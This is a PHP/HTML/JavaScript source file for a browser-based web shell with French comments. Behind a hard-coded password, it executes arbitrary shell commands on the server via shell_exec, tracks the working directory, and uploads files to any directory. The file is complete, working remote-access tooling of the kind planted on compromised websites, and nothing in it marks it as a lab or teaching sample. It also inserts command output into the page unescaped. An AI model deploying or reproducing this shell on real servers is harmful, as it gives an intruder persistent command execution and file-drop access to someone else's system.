<?php
// GÃ¨re les requÃªtes AJAX
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['ajax'])) {
    header('Content-Type: application/json');

    $PASSWORD = 'poneyponey';
    $data = json_decode(file_get_contents('php://input'), true);

    // Si le fichier est uploadÃ©, il est gÃ©rÃ© en dehors du JSON
    if (isset($_FILES['file'])) {
        if (!isset($_POST['auth']) || $_POST['auth'] !== $PASSWORD) {
            echo json_encode(['error' => 'Mot de passe invalide.']);
            exit;
        }

        $cwd = isset($_POST['cwd']) && is_dir($_POST['cwd']) ? $_POST['cwd'] : getcwd();
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $upload_path = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_path)) {
                echo json_encode(['success' => 'Fichier "' . basename($_FILES['file']['name']) . '" uploadÃ© avec succÃ¨s.']);
            } else {
                echo json_encode(['error' => 'Erreur lors de l\'upload du fichier.']);
            }
        } else {
            echo json_encode(['error' => 'Erreur: ' . $_FILES['file']['error']]);
        }
        exit;
    }

    // Gestion des commandes normales (non-upload)
    if (!isset($data['auth']) || $data['auth'] !== $PASSWORD) {
        echo json_encode(['error' => 'Mot de passe invalide.']);
        exit;
    }

    $cwd = isset($data['cwd']) && is_dir($data['cwd']) ? $data['cwd'] : getcwd();
    $cmd = isset($data['cmd']) ? trim($data['cmd']) : '';
    $output = '';

    if (preg_match('/^\s*cd\s+(.+)/', $cmd, $m)) {
        $target = trim($m[1]);
        $new_path = realpath($cwd . DIRECTORY_SEPARATOR . $target);
        if ($new_path && is_dir($new_path)) {
            $cwd = $new_path;
        }
        $output = '';
    } elseif (!empty($cmd)) {
        $full_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
        $output = shell_exec($full_cmd . ' 2>&1');
    }

    echo json_encode([
        'cmd' => $cmd,
        'output' => trim($output),
        'cwd' => $cwd
    ]);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>ðŸš Web Shell</title>
    <style>
        body {
            background:#1e1e1e;
            color:#d0d0d0;
            font-family:monospace;
            padding:20px;
            /* Suppression des styles de centrage */
        }
        .container {
            width: 100%;
            max-width: 800px;
        }
        input[type=text], input[type=password] {
            width:100%;
            padding:6px;
            background:#333;
            color:#0f0;
            border:1px solid #555;
            font-size:16px;
        }
        button {
            padding:6px 12px;
            background:#444;
            color:#fff;
            border:1px solid #777;
            cursor:pointer;
        }
        .block {
            background:#2a2a2a;
            margin-top:10px;
            padding:10px;
            border-left:4px solid #0af;
        }
        .cwd { color:#0af; font-weight:bold; }
        .cmd { color:#fff000; }
        .out { color:#0f0; white-space:pre-wrap; margin-top:5px; }
        #shell .controls {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
            width: 100%;
        }
        #shell .controls form {
            margin: 0;
            display: flex;
            flex-grow: 1;
            gap: 10px;
        }
        #shell .controls form button { flex-shrink: 0; }
        #shell .controls form input { flex-grow: 1; }

    </style>
</head>
<body>
    <div class="container">
        <h2>ðŸ’» Web Shell</h2>

        <div id="auth">
            <form onsubmit="login(); return false;">
                <input type="password" id="pw" placeholder="Mot de passe">
                <button>Valider</button>
            </form>
        </div>

        <div id="shell" style="display:none;">
            <div>RÃ©pertoire : <span class="cwd" id="cwd"></span></div>
            <div class="controls">
                <form id="commandForm" onsubmit="sendCommand(); return false;">
                    <input type="text" id="cmd" autocomplete="off" autofocus>
                    <button>ExÃ©cuter</button>
                </form>
                <!-- Formulaire d'upload de fichier -->
                <form id="uploadForm" enctype="multipart/form-data">
                    <input type="file" id="fileToUpload" name="file" style="display:none;" onchange="uploadFile()">
                    <button type="button" onclick="document.getElementById('fileToUpload').click();">Uploader un fichier</button>
                </form>
            </div>
            <div id="results"></div>
        </div>
    </div>

    <script>
        let cwd = "";
        let password = "";
        let history = [];

        function login() {
            password = document.getElementById("pw").value;
            fetch('?ajax=1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ auth: password, cmd: 'pwd', cwd: '' })
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    // Utiliser une alerte personnalisÃ©e au lieu de alert()
                    alert(data.error);
                } else {
                    cwd = data.cwd;
                    document.getElementById("cwd").textContent = cwd;
                    document.getElementById("auth").style.display = "none";
                    document.getElementById("shell").style.display = "block";
                }
            });
        }

        function sendCommand(command = null) {
            const cmd = command || document.getElementById("cmd").value;
            if (!cmd) return;
            fetch('?ajax=1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ auth: password, cmd, cwd })
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    // Utiliser une alerte personnalisÃ©e au lieu de alert()
                    alert(data.error);
                    return;
                }
                cwd = data.cwd;
                document.getElementById("cwd").textContent = cwd;

                history.push(data);
                if (history.length > 5) history.shift();

                renderResults();
                if (!command) {
                    document.getElementById("cmd").value = '';
                }
            });
        }

        function uploadFile() {
            const fileInput = document.getElementById('fileToUpload');
            if (fileInput.files.length === 0) {
                return;
            }

            const file = fileInput.files[0];
            const formData = new FormData();
            formData.append('auth', password);
            formData.append('cwd', cwd);
            formData.append('file', file);

            fetch('?ajax=1', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    // Utiliser une alerte personnalisÃ©e au lieu de alert()
                    alert(data.error);
                } else {
                    // Utiliser une alerte personnalisÃ©e au lieu de alert()
                    alert(data.success);
                    fileInput.value = ''; // RÃ©initialise l'input
                    sendCommand('ls -la'); // Actualise la liste des fichiers
                }
            })
            .catch(err => {
                console.error(err);
                // Utiliser une alerte personnalisÃ©e au lieu de alert()
                alert('Erreur rÃ©seau.');
            });
        }

        function renderResults() {
            const container = document.getElementById("results");
            container.innerHTML = '';
            for (let i = history.length - 1; i >= 0; i--) {
                const item = history[i];
                const block = document.createElement("div");
                block.className = "block";
                block.innerHTML = `
                    <div class='cwd'>${item.cwd}</div>
                    <div class='cmd'>$ ${item.cmd}</div>
                    <div class='out'>${item.output || '(aucun rÃ©sultat)'}</div>
                `;
                container.appendChild(block);
            }
        }

        // Fonction pour remplacer les alertes
        function alert(message) {
            const alertDiv = document.createElement('div');
            alertDiv.style.position = 'fixed';
            alertDiv.style.top = '20px';
            alertDiv.style.left = '50%';
            alertDiv.style.transform = 'translateX(-50%)';
            alertDiv.style.backgroundColor = '#222';
            alertDiv.style.color = '#fff';
            alertDiv.style.padding = '15px';
            alertDiv.style.borderRadius = '5px';
            alertDiv.style.zIndex = '1000';
            alertDiv.style.boxShadow = '0 4px 8px rgba(0,0,0,0.2)';
            alertDiv.textContent = message;
            document.body.appendChild(alertDiv);
            setTimeout(() => {
                document.body.removeChild(alertDiv);
            }, 3000);
        }
    </script>
</body>
</html>
